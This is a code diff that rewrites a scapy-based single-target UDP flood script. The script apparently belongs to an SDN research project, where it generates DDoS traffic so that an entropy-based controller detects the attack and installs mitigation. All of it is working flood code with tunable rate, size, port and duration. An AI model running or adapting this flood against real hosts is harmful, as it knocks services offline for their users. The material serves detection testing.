@@ -1,89 +1,128 @@
-import os
+"""Single-target volumetric UDP flood.
+
+Companion to benign_traffic.py and random_dst_flood.py:
+
+- benign_traffic.py        many sources, many destinations  -> high entropy (baseline)
+- udp_flood.py             one source, one destination      -> dst-IP entropy collapses
+- random_dst_flood.py      one source, many destinations    -> dst-IP entropy stays high
+
+This is the classic L3/L4 volumetric DDoS: a steady UDP stream toward a fixed
+victim. Used to drive destination-IP entropy below threshold so the controller
+installs mitigation.
+"""
+
+from __future__ import annotations
+
+import argparse
+import logging
 import sys
 import time
-from scapy.all import sendp, Ether, IP, UDP
 from multiprocessing import Process
 
-# Define constants
-DEFAULT_INTERFACE = "eth0"
-DEFAULT_ATTACK_DURATION = 10  # in seconds
-PACKET_SIZE = 1024  # Packet size in bytes
-ATTACK_RATE = 100  # Packets per second
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
-def launch_attack(target_ip, attack_duration=DEFAULT_ATTACK_DURATION, interface=DEFAULT_INTERFACE):
-    """
-    Function to simulate a DDoS attack by generating packets to the target IP.
-    :param target_ip: IP address of the target machine.
-    :param attack_duration: Duration of the attack in seconds.
-    :param interface: Network interface to send the packets from.
-    """
+from scapy.all import Ether, IP, UDP, sendp  # noqa: E402
+
+from ddos_sdn.utils.network import resolve_interface  # noqa: E402
+
+DEFAULT_DURATION = 10
+DEFAULT_RATE = 100
+DEFAULT_PACKET_SIZE = 1024
+DEFAULT_DPORT = 80
+DEFAULT_SPORT = 2
+
+# L2 + IP + UDP header overhead. Anything sent here is `packet_size` total on the wire,
+# so the payload is packet_size - HEADER_OVERHEAD bytes of fill.
+HEADER_OVERHEAD = 42
+
+
+def launch_attack(
+    target_ip: str,
+    duration: int,
+    rate: int,
+    packet_size: int,
+    dport: int,
+    interface: str | None,
+) -> int:
+    payload_len = max(0, packet_size - HEADER_OVERHEAD)
+    payload = "X" * payload_len
+    pkt = Ether() / IP(dst=target_ip) / UDP(sport=DEFAULT_SPORT, dport=dport) / payload
+    inter_packet_delay = 1.0 / rate
+    iface = resolve_interface(interface)
+
+    end_time = time.time() + duration
+    sent = 0
+    while time.time() < end_time:
+        if iface is not None:
+            sendp(pkt, iface=iface, verbose=0)
+        else:
+            sendp(pkt, verbose=0)
+        sent += 1
+        time.sleep(inter_packet_delay)
+    return sent
+
+
+def parse_args(argv: list[str]) -> argparse.Namespace:
+    parser = argparse.ArgumentParser(
+        description="Single-target volumetric UDP flood. Sends a fixed packet "
+                    "repeatedly to one destination for a bounded duration.",
+    )
+    parser.add_argument(
+        "target_ip",
+        help="victim IP address (e.g. 10.0.0.64)",
+    )
+    parser.add_argument(
+        "--duration", type=int, default=DEFAULT_DURATION,
+        help=f"flood duration in seconds (default: {DEFAULT_DURATION})",
+    )
+    parser.add_argument(
+        "--rate", type=int, default=DEFAULT_RATE,
+        help=f"packets per second (default: {DEFAULT_RATE})",
+    )
+    parser.add_argument(
+        "--packet-size", type=int, default=DEFAULT_PACKET_SIZE,
+        help=f"packet size in bytes including L2/L3/L4 headers (default: {DEFAULT_PACKET_SIZE})",
+    )
+    parser.add_argument(
+        "--dport", type=int, default=DEFAULT_DPORT,
+        help=f"destination UDP port (default: {DEFAULT_DPORT})",
+    )
+    parser.add_argument(
+        "--interface", default=None,
+        help="network interface to send packets on (default: auto-select via psutil)",
+    )
+    args = parser.parse_args(argv)
+    if args.duration <= 0:
+        parser.error("--duration must be > 0")
+    if args.rate <= 0:
+        parser.error("--rate must be > 0")
+    if args.packet_size < HEADER_OVERHEAD:
+        parser.error(f"--packet-size must be >= {HEADER_OVERHEAD} (L2+L3+L4 header overhead)")
+    if not (0 <= args.dport <= 65535):
+        parser.error("--dport must be in [0, 65535]")
+    return args
+
+
+def main(argv: list[str] | None = None) -> None:
+    args = parse_args(argv if argv is not None else sys.argv[1:])
+    print(
+        f"udp_flood: target={args.target_ip} duration={args.duration}s "
+        f"rate={args.rate}pps size={args.packet_size}B dport={args.dport}"
+    )
+    proc = Process(
+        target=launch_attack,
+        args=(args.target_ip, args.duration, args.rate, args.packet_size, args.dport, args.interface),
+    )
+    proc.start()
     try:
-        print(f"Launching DDoS attack on {target_ip} for {attack_duration} seconds...")
-        
-        # Generate packets
-        packet = Ether() / IP(dst=target_ip) / UDP(dport=80) / ("X" * (PACKET_SIZE - 42))  # Create a dummy packet
-
-        end_time = time.time() + attack_duration
-        while time.time() < end_time:
-            sendp(packet, iface=interface, verbose=0)
-            time.sleep(1.0 / ATTACK_RATE)  # Limit the attack rate
-
-        print(f"Attack on {target_ip} completed.")
-
-    except Exception as e:
-        print(f"Error while launching attack: {e}")
-        sys.exit(1)
-
-
-def monitor_attack():
-    """
-    Function to monitor the status of the attack.
-    Currently a placeholder function.
-    """
-    # This function could be expanded to include logging, monitoring of traffic patterns, etc.
-    print("Monitoring attack traffic...")
-
-def stop_attack():
-    """
-    Function to stop the DDoS attack.
-    For now, we assume killing the process stops the attack.
-    """
-    print("Stopping the attack... (Currently, this process stops when the main function ends.)")
-
-
-def main(target_ip):
-    """
-    Main function to launch the attack in a separate process for better control.
-    :param target_ip: IP address of the target machine.
-    """
-    try:
-        attack_duration = int(input("Enter attack duration (in seconds): "))
-        p = Process(target=launch_attack, args=(target_ip, attack_duration))
-        p.start()
-        
-        monitor_attack()  # Add monitoring functionality if needed
-        
-        p.join()  # Wait for the attack process to finish
-        stop_attack()
-
+        proc.join()
     except KeyboardInterrupt:
-        print("Attack interrupted.")
-        stop_attack()
-        sys.exit(0)
-
-    except ValueError:
-        print("Invalid input for attack duration. Please enter a valid integer.")
-        sys.exit(1)
-
-    except Exception as e:
-        print(f"Unexpected error: {e}")
-        sys.exit(1)
+        print("udp_flood: interrupted", file=sys.stderr)
+        proc.terminate()
+        proc.join()
+        sys.exit(130)
+    print(f"udp_flood: completed (target={args.target_ip})")
 
 
 if __name__ == "__main__":
-    if len(sys.argv) != 2:
-        print("Usage: python Trafficlaunch.py <target_ip>")
-        sys.exit(1)
-
-    target_ip = sys.argv[1]
-    main(target_ip)
+    main()
